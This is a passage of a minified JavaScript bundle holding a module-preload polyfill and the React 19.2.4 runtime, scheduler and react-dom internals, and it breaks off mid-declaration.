(function(){const B=document.createElement("link").relList;if(B&&B.supports&&B.supports("modulepreload"))return;for(const k of document.querySelectorAll('link[rel="modulepreload"]'))m(k);new MutationObserver(k=>{for(const W of k)if(W.type==="childList")for(const ce of W.addedNodes)ce.tagName==="LINK"&&ce.rel==="modulepreload"&&m(ce)}).observe(document,{childList:!0,subtree:!0});function X(k){const W={};return k.integrity&&(W.integrity=k.integrity),k.referrerPolicy&&(W.referrerPolicy=k.referrerPolicy),k.crossOrigin==="use-credentials"?W.credentials="include":k.crossOrigin==="anonymous"?W.credentials="omit":W.credentials="same-origin",W}function m(k){if(k.ep)return;k.ep=!0;const W=X(k);fetch(k.href,W)}})();var Xu={exports:{}},ti={};var Pd;function Hy(){if(Pd)return ti;Pd=1;var z=Symbol.for("react.transitional.element"),B=Symbol.for("react.fragment");function X(m,k,W){var ce=null;if(W!==void 0&&(ce=""+W),k.key!==void 0&&(ce=""+k.key),"key"in k){W={};for(var Me in k)Me!=="key"&&(W[Me]=k[Me])}else W=k;return k=W.ref,{$$typeof:z,type:m,key:ce,ref:k!==void 0?k:null,props:W}}return ti.Fragment=B,ti.jsx=X,ti.jsxs=X,ti}var eh;function ky(){return eh||(eh=1,Xu.exports=Hy()),Xu.exports}var s=ky(),Qu={exports:{}},te={};var th;function Ry(){if(th)return te;th=1;var z=Symbol.for("react.transitional.element"),B=Symbol.for("react.portal"),X=Symbol.for("react.fragment"),m=Symbol.for("react.strict_mode"),k=Symbol.for("react.profiler"),W=Symbol.for("react.consumer"),ce=Symbol.for("react.context"),Me=Symbol.for("react.forward_ref"),q=Symbol.for("react.suspense"),C=Symbol.for("react.memo"),ue=Symbol.for("react.lazy"),Q=Symbol.for("react.activity"),Te=Symbol.iterator;function se(f){return f===null||typeof f!="object"?null:(f=Te&&f[Te]||f["@@iterator"],typeof f=="function"?f:null)}var Ge={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},Ve=Object.assign,mt={};function ve(f,j,w){this.props=f,this.context=j,this.refs=mt,this.updater=w||Ge}ve.prototype.isReactComponent={},ve.prototype.setState=function(f,j){if(typeof f!="object"&&typeof f!="function"&&f!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,f,j,"setState")},ve.prototype.forceUpdate=function(f){this.updater.enqueueForceUpdate(this,f,"forceUpdate")};function st(){}st.prototype=ve.prototype;function G(f,j,w){this.props=f,this.context=j,this.refs=mt,this.updater=w||Ge}var tt=G.prototype=new st;tt.constructor=G,Ve(tt,ve.prototype),tt.isPureReactComponent=!0;var O=Array.isArray;function R(){}var D={H:null,A:null,T:null,S:null},H=Object.prototype.hasOwnProperty;function Ke(f,j,w){var U=w.ref;return{$$typeof:z,type:f,key:j,ref:U!==void 0?U:null,props:w}}function He(f,j){return Ke(f.type,j,f.props)}function ft(f){return typeof f=="object"&&f!==null&&f.$$typeof===z}function pe(f){var j={"=":"=0",":":"=2"};return"$"+f.replace(/[=:]/g,function(w){return j[w]})}var De=/\/+/g;function Je(f,j){return typeof f=="object"&&f!==null&&f.key!=null?pe(""+f.key):j.toString(36)}function Ne(f){switch(f.status){case"fulfilled":return f.value;case"rejected":throw f.reason;default:switch(typeof f.status=="string"?f.then(R,R):(f.status="pending",f.then(function(j){f.status==="pending"&&(f.status="fulfilled",f.value=j)},function(j){f.status==="pending"&&(f.status="rejected",f.reason=j)})),f.status){case"fulfilled":return f.value;case"rejected":throw f.reason}}throw f}function S(f,j,w,U,P){var ie=typeof f;(ie==="undefined"||ie==="boolean")&&(f=null);var re=!1;if(f===null)re=!0;else switch(ie){case"bigint":case"string":case"number":re=!0;break;case"object":switch(f.$$typeof){case z:case B:re=!0;break;case ue:return re=f._init,S(re(f._payload),j,w,U,P)}}if(re)return P=P(f),re=U===""?"."+Je(f,0):U,O(P)?(w="",re!=null&&(w=re.replace(De,"$&/")+"/"),S(P,j,w,"",function(Ht){return Ht})):P!=null&&(ft(P)&&(P=He(P,w+(P.key==null||f&&f.key===P.key?"":(""+P.key).replace(De,"$&/")+"/")+re)),j.push(P)),1;re=0;var lt=U===""?".":U+":";if(O(f))for(var xe=0;xe<f.length;xe++)U=f[xe],ie=lt+Je(U,xe),re+=S(U,j,w,ie,P);else if(xe=se(f),typeof xe=="function")for(f=xe.call(f),xe=0;!(U=f.next()).done;)U=U.value,ie=lt+Je(U,xe++),re+=S(U,j,w,ie,P);else if(ie==="object"){if(typeof f.then=="function")return S(Ne(f),j,w,U,P);throw j=String(f),Error("Objects are not valid as a React child (found: "+(j==="[object Object]"?"object with keys {"+Object.keys(f).join(", ")+"}":j)+"). If you meant to render a collection of children, use an array instead.")}return re}function _(f,j,w){if(f==null)return f;var U=[],P=0;return S(f,U,"","",function(ie){return j.call(w,ie,P++)}),U}function K(f){if(f._status===-1){var j=f._result;j=j(),j.then(function(w){(f._status===0||f._status===-1)&&(f._status=1,f._result=w)},function(w){(f._status===0||f._status===-1)&&(f._status=2,f._result=w)}),f._status===-1&&(f._status=0,f._result=j)}if(f._status===1)return f._result.default;throw f._result}var I=typeof reportError=="function"?reportError:function(f){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var j=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof f=="object"&&f!==null&&typeof f.message=="string"?String(f.message):String(f),error:f});if(!window.dispatchEvent(j))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",f);return}console.error(f)},oe={map:_,forEach:function(f,j,w){_(f,function(){j.apply(this,arguments)},w)},count:function(f){var j=0;return _(f,function(){j++}),j},toArray:function(f){return _(f,function(j){return j})||[]},only:function(f){if(!ft(f))throw Error("React.Children.only expected to receive a single React element child.");return f}};return te.Activity=Q,te.Children=oe,te.Component=ve,te.Fragment=X,te.Profiler=k,te.PureComponent=G,te.StrictMode=m,te.Suspense=q,te.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=D,te.__COMPILER_RUNTIME={__proto__:null,c:function(f){return D.H.useMemoCache(f)}},te.cache=function(f){return function(){return f.apply(null,arguments)}},te.cacheSignal=function(){return null},te.cloneElement=function(f,j,w){if(f==null)throw Error("The argument must be a React element, but you passed "+f+".");var U=Ve({},f.props),P=f.key;if(j!=null)for(ie in j.key!==void 0&&(P=""+j.key),j)!H.call(j,ie)||ie==="key"||ie==="__self"||ie==="__source"||ie==="ref"&&j.ref===void 0||(U[ie]=j[ie]);var ie=arguments.length-2;if(ie===1)U.children=w;else if(1<ie){for(var re=Array(ie),lt=0;lt<ie;lt++)re[lt]=arguments[lt+2];U.children=re}return Ke(f.type,P,U)},te.createContext=function(f){return f={$$typeof:ce,_currentValue:f,_currentValue2:f,_threadCount:0,Provider:null,Consumer:null},f.Provider=f,f.Consumer={$$typeof:W,_context:f},f},te.createElement=function(f,j,w){var U,P={},ie=null;if(j!=null)for(U in j.key!==void 0&&(ie=""+j.key),j)H.call(j,U)&&U!=="key"&&U!=="__self"&&U!=="__source"&&(P[U]=j[U]);var re=arguments.length-2;if(re===1)P.children=w;else if(1<re){for(var lt=Array(re),xe=0;xe<re;xe++)lt[xe]=arguments[xe+2];P.children=lt}if(f&&f.defaultProps)for(U in re=f.defaultProps,re)P[U]===void 0&&(P[U]=re[U]);return Ke(f,ie,P)},te.createRef=function(){return{current:null}},te.forwardRef=function(f){return{$$typeof:Me,render:f}},te.isValidElement=ft,te.lazy=function(f){return{$$typeof:ue,_payload:{_status:-1,_result:f},_init:K}},te.memo=function(f,j){return{$$typeof:C,type:f,compare:j===void 0?null:j}},te.startTransition=function(f){var j=D.T,w={};D.T=w;try{var U=f(),P=D.S;P!==null&&P(w,U),typeof U=="object"&&U!==null&&typeof U.then=="function"&&U.then(R,I)}catch(ie){I(ie)}finally{j!==null&&w.types!==null&&(j.types=w.types),D.T=j}},te.unstable_useCacheRefresh=function(){return D.H.useCacheRefresh()},te.use=function(f){return D.H.use(f)},te.useActionState=function(f,j,w){return D.H.useActionState(f,j,w)},te.useCallback=function(f,j){return D.H.useCallback(f,j)},te.useContext=function(f){return D.H.useContext(f)},te.useDebugValue=function(){},te.useDeferredValue=function(f,j){return D.H.useDeferredValue(f,j)},te.useEffect=function(f,j){return D.H.useEffect(f,j)},te.useEffectEvent=function(f){return D.H.useEffectEvent(f)},te.useId=function(){return D.H.useId()},te.useImperativeHandle=function(f,j,w){return D.H.useImperativeHandle(f,j,w)},te.useInsertionEffect=function(f,j){return D.H.useInsertionEffect(f,j)},te.useLayoutEffect=function(f,j){return D.H.useLayoutEffect(f,j)},te.useMemo=function(f,j){return D.H.useMemo(f,j)},te.useOptimistic=function(f,j){return D.H.useOptimistic(f,j)},te.useReducer=function(f,j,w){return D.H.useReducer(f,j,w)},te.useRef=function(f){return D.H.useRef(f)},te.useState=function(f){return D.H.useState(f)},te.useSyncExternalStore=function(f,j,w){return D.H.useSyncExternalStore(f,j,w)},te.useTransition=function(){return D.H.useTransition()},te.version="19.2.4",te}var lh;function co(){return lh||(lh=1,Qu.exports=Ry()),Qu.exports}var F=co(),Zu={exports:{}},li={},Ku={exports:{}},Ju={};var ah;function Uy(){return ah||(ah=1,(function(z){function B(S,_){var K=S.length;S.push(_);e:for(;0<K;){var I=K-1>>>1,oe=S[I];if(0<k(oe,_))S[I]=_,S[K]=oe,K=I;else break e}}function X(S){return S.length===0?null:S[0]}function m(S){if(S.length===0)return null;var _=S[0],K=S.pop();if(K!==_){S[0]=K;e:for(var I=0,oe=S.length,f=oe>>>1;I<f;){var j=2*(I+1)-1,w=S[j],U=j+1,P=S[U];if(0>k(w,K))U<oe&&0>k(P,w)?(S[I]=P,S[U]=K,I=U):(S[I]=w,S[j]=K,I=j);else if(U<oe&&0>k(P,K))S[I]=P,S[U]=K,I=U;else break e}}return _}function k(S,_){var K=S.sortIndex-_.sortIndex;return K!==0?K:S.id-_.id}if(z.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var W=performance;z.unstable_now=function(){return W.now()}}else{var ce=Date,Me=ce.now();z.unstable_now=function(){return ce.now()-Me}}var q=[],C=[],ue=1,Q=null,Te=3,se=!1,Ge=!1,Ve=!1,mt=!1,ve=typeof setTimeout=="function"?setTimeout:null,st=typeof clearTimeout=="function"?clearTimeout:null,G=typeof setImmediate<"u"?setImmediate:null;function tt(S){for(var _=X(C);_!==null;){if(_.callback===null)m(C);else if(_.startTime<=S)m(C),_.sortIndex=_.expirationTime,B(q,_);else break;_=X(C)}}function O(S){if(Ve=!1,tt(S),!Ge)if(X(q)!==null)Ge=!0,R||(R=!0,pe());else{var _=X(C);_!==null&&Ne(O,_.startTime-S)}}var R=!1,D=-1,H=5,Ke=-1;function He(){return mt?!0:!(z.unstable_now()-Ke<H)}function ft(){if(mt=!1,R){var S=z.unstable_now();Ke=S;var _=!0;try{e:{Ge=!1,Ve&&(Ve=!1,st(D),D=-1),se=!0;var K=Te;try{t:{for(tt(S),Q=X(q);Q!==null&&!(Q.expirationTime>S&&He());){var I=Q.callback;if(typeof I=="function"){Q.callback=null,Te=Q.priorityLevel;var oe=I(Q.expirationTime<=S);if(S=z.unstable_now(),typeof oe=="function"){Q.callback=oe,tt(S),_=!0;break t}Q===X(q)&&m(q),tt(S)}else m(q);Q=X(q)}if(Q!==null)_=!0;else{var f=X(C);f!==null&&Ne(O,f.startTime-S),_=!1}}break e}finally{Q=null,Te=K,se=!1}_=void 0}}finally{_?pe():R=!1}}}var pe;if(typeof G=="function")pe=function(){G(ft)};else if(typeof MessageChannel<"u"){var De=new MessageChannel,Je=De.port2;De.port1.onmessage=ft,pe=function(){Je.postMessage(null)}}else pe=function(){ve(ft,0)};function Ne(S,_){D=ve(function(){S(z.unstable_now())},_)}z.unstable_IdlePriority=5,z.unstable_ImmediatePriority=1,z.unstable_LowPriority=4,z.unstable_NormalPriority=3,z.unstable_Profiling=null,z.unstable_UserBlockingPriority=2,z.unstable_cancelCallback=function(S){S.callback=null},z.unstable_forceFrameRate=function(S){0>S||125<S?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):H=0<S?Math.floor(1e3/S):5},z.unstable_getCurrentPriorityLevel=function(){return Te},z.unstable_next=function(S){switch(Te){case 1:case 2:case 3:var _=3;break;default:_=Te}var K=Te;Te=_;try{return S()}finally{Te=K}},z.unstable_requestPaint=function(){mt=!0},z.unstable_runWithPriority=function(S,_){switch(S){case 1:case 2:case 3:case 4:case 5:break;default:S=3}var K=Te;Te=S;try{return _()}finally{Te=K}},z.unstable_scheduleCallback=function(S,_,K){var I=z.unstable_now();switch(typeof K=="object"&&K!==null?(K=K.delay,K=typeof K=="number"&&0<K?I+K:I):K=I,S){case 1:var oe=-1;break;case 2:oe=250;break;case 5:oe=1073741823;break;case 4:oe=1e4;break;default:oe=5e3}return oe=K+oe,S={id:ue++,callback:_,priorityLevel:S,startTime:K,expirationTime:oe,sortIndex:-1},K>I?(S.sortIndex=K,B(C,S),X(q)===null&&S===X(C)&&(Ve?(st(D),D=-1):Ve=!0,Ne(O,K-I))):(S.sortIndex=oe,B(q,S),Ge||se||(Ge=!0,R||(R=!0,pe()))),S},z.unstable_shouldYield=He,z.unstable_wrapCallback=function(S){var _=Te;return function(){var K=Te;Te=_;try{return S.apply(this,arguments)}finally{Te=K}}}})(Ju)),Ju}var nh;function Ly(){return nh||(nh=1,Ku.exports=Uy()),Ku.exports}var Wu={exports:{}},ht={};var ih;function By(){if(ih)return ht;ih=1;var z=co();function B(q){var C="https://react.dev/errors/"+q;if(1<arguments.length){C+="?args[]="+encodeURIComponent(arguments[1]);for(var ue=2;ue<arguments.length;ue++)C+="&args[]="+encodeURIComponent(arguments[ue])}return"Minified React error #"+q+"; visit "+C+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function X(){}var m={d:{f:X,r:function(){throw Error(B(522))},D:X,C:X,L:X,m:X,X,S:X,M:X},p:0,findDOMNode:null},k=Symbol.for("react.portal");function W(q,C,ue){var Q=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:k,key:Q==null?null:""+Q,children:q,containerInfo:C,implementation:ue}}var ce=z.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function Me(q,C){if(q==="font")return"";if(typeof C=="string")return C==="use-credentials"?C:""}return ht.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=m,ht.createPortal=function(q,C){var ue=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!C||C.nodeType!==1&&C.nodeType!==9&&C.nodeType!==11)throw Error(B(299));return W(q,C,null,ue)},ht.flushSync=function(q){var C=ce.T,ue=m.p;try{if(ce.T=null,m.p=2,q)return q()}finally{ce.T=C,m.p=ue,m.d.f()}},ht.preconnect=function(q,C){typeof q=="string"&&(C?(C=C.crossOrigin,C=typeof C=="string"?C==="use-credentials"?C:"":void 0):C=null,m.d.C(q,C))},ht.prefetchDNS=function(q){typeof q=="string"&&m.d.D(q)},ht.preinit=function(q,C){if(typeof q=="string"&&C&&typeof C.as=="string"){var ue=C.as,Q=Me(ue,C.crossOrigin),Te=typeof C.integrity=="string"?C.integrity:void 0,se=typeof C.fetchPriority=="string"?C.fetchPriority:void 0;ue==="style"?m.d.S(q,typeof C.precedence=="string"?C.precedence:void 0,{crossOrigin:Q,integrity:Te,fetchPriority:se}):ue==="script"&&m.d.X(q,{crossOrigin:Q,integrity:Te,fetchPriority:se,nonce:typeof C.nonce=="string"?C.nonce:void 0})}},ht.preinitModule=function(q,C){if(typeof q=="string")if(typeof C=="object"&&C!==null){if(C.as==null||C.as==="script"){var ue=Me(C.as,C.crossOrigin);m.d.M(q,{crossOrigin:ue,integrity:typeof C.integrity=="string"?C.integrity:void 0,nonce:typeof C.nonce=="string"?C.nonce:void 0})}}else C==null&&m.d.M(q)},ht.preload=function(q,C){if(typeof q=="string"&&typeof C=="object"&&C!==null&&typeof C.as=="string"){var ue=C.as,Q=Me(ue,C.crossOrigin);m.d.L(q,ue,{crossOrigin:Q,integrity:typeof C.integrity=="string"?C.integrity:void 0,nonce:typeof C.nonce=="string"?C.nonce:void 0,type:typeof C.type=="string"?C.type:void 0,fetchPriority:typeof C.fetchPriority=="string"?C.fetchPriority:void 0,referrerPolicy:typeof C.referrerPolicy=="string"?C.referrerPolicy:void 0,imageSrcSet:typeof C.imageSrcSet=="string"?C.imageSrcSet:void 0,imageSizes:typeof C.imageSizes=="string"?C.imageSizes:void 0,media:typeof C.media=="string"?C.media:void 0})}},ht.preloadModule=function(q,C){if(typeof q=="string")if(C){var ue=Me(C.as,C.crossOrigin);m.d.m(q,{as:typeof C.as=="string"&&C.as!=="script"?C.as:void 0,crossOrigin:ue,integrity:typeof C.integrity=="string"?C.integrity:void 0})}else m.d.m(q)},ht.requestFormReset=function(q){m.d.r(q)},ht.unstable_batchedUpdates=function(q,C){return q(C)},ht.useFormState=function(q,C,ue){return ce.H.useFormState(q,C,ue)},ht.useFormStatus=function(){return ce.H.useHostTransitionStatus()},ht.version="19.2.4",ht}var sh;function Yy(){if(sh)return Wu.exports;sh=1;function z(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(z)}catch(B){console.error(B)}}return z(),Wu.exports=By(),Wu.exports}var ch;function qy(){if(ch)return li;ch=1;var z=Ly(),B=co(),X=Yy();function m(e){var t="https://react.dev/errors/"+e;if(1<arguments.length){t+="?args[]="+encodeURIComponent(arguments[1]);for(var l=2;l<arguments.length;l++)t+="&args[]="+encodeURIComponent(arguments[l])}return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function k(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function W(e){var t=e,l=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(l=t.return),e=t.return;while(e)}return t.tag===3?l:null}function ce(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Me(e){if(e.tag===31){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function q(e){if(W(e)!==e)throw Error(m(188))}function C(e){var t=e.alternate;if(!t){if(t=W(e),t===null)throw Error(m(188));return t!==e?null:e}for(var l=e,a=t;;){var n=l.return;if(n===null)break;var i=n.alternate;if(i===null){if(a=n.return,a!==null){l=a;continue}break}if(n.child===i.child){for(i=n.child;i;){if(i===l)return q(n),e;if(i===a)return q(n),t;i=i.sibling}throw Error(m(188))}if(l.return!==a.return)l=n,a=i;else{for(var c=!1,u=n.child;u;){if(u===l){c=!0,l=n,a=i;break}if(u===a){c=!0,a=n,l=i;break}u=u.sibling}if(!c){for(u=i.child;u;){if(u===l){c=!0,l=i,a=n;break}if(u===a){c=!0,a=i,l=n;break}u=u.sibling}if(!c)throw Error(m(189))}}if(l.alternate!==a)throw Error(m(190))}if(l.tag!==3)throw Error(m(188));return l.stateNode.current===l?e:t}function ue(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e;for(e=e.child;e!==null;){if(t=ue(e),t!==null)return t;e=e.sibling}return null}var Q=Object.assign,Te=Symbol.for("react.element"),se=Symbol.for("react.transitional.element"),Ge=Symbol.for("react.portal"),Ve=Symbol.for("react.fragment"),mt=Symbol.for("react.strict_mode"),ve=Symbol.for("react.profiler"),st=Symbol.for("react.consumer"),G=Symbol.for("react.context"),tt=Symbol.for("react.forward_ref"),O=Symbol.for("react.suspense"),R=Symbol.for("react.suspense_list"),D=Symbol.for("react.memo"),H=Symbol.for("react.lazy"),Ke=Symbol.for("react.activity"),He=Symbol.for("react.memo_cache_sentinel"),ft=Symbol.iterator;function pe(e){return e===null||typeof e!="object"?null:(e=ft&&e[ft]||e["@@iterator"],typeof e=="function"?e:null)}var De=Symbol.for("react.client.reference");function Je(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===De?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case Ve:return"Fragment";case ve:return"Profiler";case mt:return"StrictMode";case O:return"Suspense";case R:return"SuspenseList";case Ke:return"Activity"}if(typeof e=="object")switch(e.$$typeof){case Ge:return"Portal";case G:return e.displayName||"Context";case st:return(e._context.displayName||"Context")+".Consumer";case tt:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case D:return t=e.displayName||null,t!==null?t:Je(e.type)||"Memo";case H:t=e._payload,e=e._init;try{return Je(e(t))}catch{}}return null}var Ne=Array.isArray,S=B.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,_=X.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,K={pending:!1,data:null,method:null,action:null},I=[],oe=-1;function f(e){return{current:e}}function j(e){0>oe||(e.current=I[oe],I[oe]=null,oe--)}function w(e,t){oe++,I[oe]=e.current,e.current=t}var U=f(null),P=f(null),ie=f(null),re=f(null);function lt(e,t){switch(w(ie,t),w(P,e),w(U,null),t.nodeType){case 9:case 11:e=(e=t.documentElement)&&(e=e.namespaceURI)?jd(e):0;break;default:if(e=t.tagName,t=t.namespaceURI)t=jd(t),e=Td(t,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}j(U),w(U,e)}function xe(){j(U),j(P),j(ie)}function Ht(e){e.memoizedState!==null&&w(re,e);var t=U.current,l=Td(t,e.type);t!==l&&(w(P,e),w(U,l))}function ll(e){P.current===e&&(j(U),j(P)),re.current===e&&(j(re),Fn._currentValue=K)}var Cl,Ce;function al(e){if(Cl===void 0)try{throw Error()}catch(l){var t=l.stack.trim().match(/\n( *(at )?)/);Cl=t&&t[1]||"",Ce=-1<l.stack.indexOf(`
    at`)?" (<anonymous>)":-1<l.stack.indexOf("@")?"@unknown:0:0":""}return`
`+Cl+e+Ce}var dt=!1;function Wt(e,t){if(!e||dt)return"";dt=!0;var l=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var a={DetermineComponentFrameRoot:function(){try{if(t){var A=function(){throw Error()};if(Object.defineProperty(A.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(A,[])}catch(v){var g=v}Reflect.construct(e,[],A)}else{try{A.call()}catch(v){g=v}e.call(A.prototype)}}else{try{throw Error()}catch(v){g=v}(A=e())&&typeof A.catch=="function"&&A.catch(function(){})}}catch(v){if(v&&g&&typeof v.stack=="string")return[v.stack,g.stack]}return[null,null]}};a.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var n=Object.getOwnPropertyDescriptor(a.DetermineComponentFrameRoot,"name");n&&n.configurable&&Object.defineProperty(a.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var i=a.DetermineComponentFrameRoot(),c=i[0],u=i[1];if(c&&u){var r=c.split(`
`),p=u.split(`
`);for(n=a=0;a<r.length&&!r[a].includes("DetermineComponentFrameRoot");)a++;for(;n<p.length&&!p[n].includes("DetermineComponentFrameRoot");)n++;if(a===r.length||n===p.length)for(a=r.length-1,n=p.length-1;1<=a&&0<=n&&r[a]!==p[n];)n--;for(;1<=a&&0<=n;a--,n--)if(r[a]!==p[n]){if(a!==1||n!==1)do if(a--,n--,0>n||r[a]!==p[n]){var x=`
`+r[a].replace(" at new "," at ");return e.displayName&&x.includes("<anonymous>")&&(x=x.replace("<anonymous>",e.displayName)),x}while(1<=a&&0<=n);break}}}finally{dt=!1,Error.prepareStackTrace=l}return(l=e?e.displayName||e.name:"")?al(l):""}function Xe(e,t){switch(e.tag){case 26:case 27:case 5:return al(e.type);case 16:return al("Lazy");case 13:return e.child!==t&&t!==null?al("Suspense Fallback"):al("Suspense");case 19:return al("SuspenseList");case 0:case 15:return Wt(e.type,!1);case 11:return Wt(e.type.render,!1);case 1:return Wt(e.type,!0);case 31:return al("Activity");default:return""}}function ee(e){try{var t="",l=null;do t+=Xe(e,l),l=e,e=e.return;while(e);return t}catch(a){return`
Error generating stack: `+a.message+`
`+a.stack}}var ga=Object.prototype.hasOwnProperty,va=z.unstable_scheduleCallback,rn=z.unstable_cancelCallback,_s=z.unstable_shouldYield,Ms=z.unstable_requestPaint,yt=z.unstable_now,si=z.unstable_getCurrentPriorityLevel,ci=z.unstable_ImmediatePriority,ui=z.unstable_UserBlockingPriority,ba=z.unstable_NormalPriority,fn=z.unstable_LowPriority,oi=z.unstable_IdlePriority,ri=z.log,fi=z.unstable_setDisableYieldValue,$l=null,pt=null;function $t(e){if(typeof ri=="function"&&fi(e),pt&&typeof pt.setStrictMode=="function")try{pt.setStrictMode($l,e)}catch{}}var gt=Math.clz32?Math.clz32:ks,Ds=Math.log,Hs=Math.LN2;function ks(e){return e>>>=0,e===0?32:31-(Ds(e)/Hs|0)|0}var Sa=256,xa=262144,ja=4194304;function nl(e){var t=e&42;if(t!==0)return t;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&261888;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function Ta(e,t,l){var a=e.pendingLanes;if(a===0)return 0;var n=0,i=e.suspendedLanes,c=e.pingedLanes;e=e.warmLanes;var u=a&134217727;return u!==0?(a=u&~i,a!==0?n=nl(a):(c&=u,c!==0?n=nl(c):l||(l=u&~e,l!==0&&(n=nl(l))))):(u=a&~i,u!==0?n=nl(u):c!==0?n=nl(c):l||(l=a&~e,l!==0&&(n=nl(l)))),n===0?0:t!==0&&t!==n&&(t&i)===0&&(i=n&-n,l=t&-t,i>=l||i===32&&(l&4194048)!==0)?t:n}function Fl(e,t){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&t)===0}function Rs(e,t){switch(e){case 1:case 2:case 4:case 8:case 64:return t+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function di(){var e=ja;return ja<<=1,(ja&62914560)===0&&(ja=4194304),e}function dn(e){for(var t=[],l=0;31>l;l++)t.push(e);return t}function Il(e,t){e.pendingLanes|=t,t!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function hn(e,t,l,a,n,i){var c=e.pendingLanes;e.pendingLanes=l,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=l,e.entangledLanes&=l,e.errorRecoveryDisabledLanes&=l,e.shellSuspendCounter=0;var u=e.entanglements,r=e.expirationTimes,p=e.hiddenUpdates;for(l=c&~l;0<l;){var x=31-gt(l),A=1<<x;u[x]=0,r[x]=-1;var g=p[x];if(g!==null)for(p[x]=null,x=0;x<g.length;x++){var v=g[x];v!==null&&(v.lane&=-536870913)}l&=~A}a!==0&&Na(e,a,0),i!==0&&n===0&&e.tag!==0&&(e.suspendedLanes|=i&~(c&~t))}function Na(e,t,l){e.pendingLanes|=t,e.suspendedLanes&=~t;var a=31-gt(t);e.entangledLanes|=t,e.entanglements[a]=e.entanglements[a]|1073741824|l&261930}function hi(e,t){var l=e.entangledLanes|=t;for(e=e.entanglements;l;){var a=31-gt(l),n=1<<a;n&t|e[a]&t&&(e[a]|=t),l&=~n}}function o(e,t){var l=t&-t;return l=(l&42)!==0?1:T(l),(l&(e.suspendedLanes|t))!==0?0:l}function T(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function b(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function E(){var e=_.p;return e!==0?e:(e=window.event,e===void 0?32:Zd(e.type))}function M(e,t){var l=_.p;try{return _.p=e,t()}finally{_.p=l}}var V=Math.random().toString(36).slice(2),$="__reactFiber$"+V,fe="__reactProps$"+V,Ue="__reactContainer$"+V,Ct="__reactEvents$"+V,Be="__reactListeners$"+V,At="__reactHandles$"+V,mi="__reactResources$"+V,Pl="__reactMarker$"+V;function Pe(e){delete e[$],delete e[fe],delete e[Ct],delete e[Be],delete e[At]}function at(e){var t=e[$];if(t)return t;for(var l=e.parentNode;l;){if(t=l[Ue]||l[$]){if(l=t.alternate,t.child!==null||l!==null&&l.child!==null)for(e=wd(e);e!==null;){if(l=e[$])return l;e=wd(e)}return t}e=l,l=e.parentNode}return null}function il(e){if(e=e[$]||e[Ue]){var t=e.tag;if(t===5||t===6||t===13||t===31||t===26||t===27||t===3)return e}return null}function sl(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e.stateNode;throw Error(m(33))}function Ca(e){var t=e[mi];return t||(t=e[mi]={hoistableStyles:new Map,hoistableScripts:new Map}),t}function nt(e){e[Pl]=!0}var uo=new Set,oo={};function 